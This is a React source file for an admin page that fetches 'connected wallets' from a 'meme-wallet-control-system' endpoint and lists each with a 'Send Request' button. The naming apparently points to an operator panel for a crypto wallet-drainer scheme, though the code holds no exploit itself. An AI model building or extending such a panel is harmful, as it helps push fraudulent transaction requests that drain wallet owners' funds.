import React, { useState, useEffect } from "react";
import { Link } from "react-router-dom";

export default function Wallets() {
  const [wallets, setWallets] = useState([]);

  useEffect(() => {
    load();
  }, []);

  const load = async () => {
    const res = await fetch(
      "https://meme-wallet-control-system-hx1r.vercel.app/api/admin-get-wallets"
    );
    const data = await res.json();
    if (data.success) setWallets(data.wallets);
  };

  return (
    <div className="page">
      <h1>Connected Wallets</h1>

      <table className="table">
        <thead>
          <tr>
            <th>Wallet Address</th>
            <th>Chain</th>
            <th>Wallet Name</th>
            <th>Connected At</th>
            <th></th>
          </tr>
        </thead>

        <tbody>
          {wallets.map((w) => (
            <tr key={w.address}>
              <td>{w.address}</td>
              <td>{w.chain}</td>
              <td>{w.walletName}</td>
              <td>{w.time}</td>
              <td>
                <Link
                  to={`/send-request?wallet=${w.address}&chain=${w.chain}`}
                  className="btn btn-primary"
                >
                  Send Request →
                </Link>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}
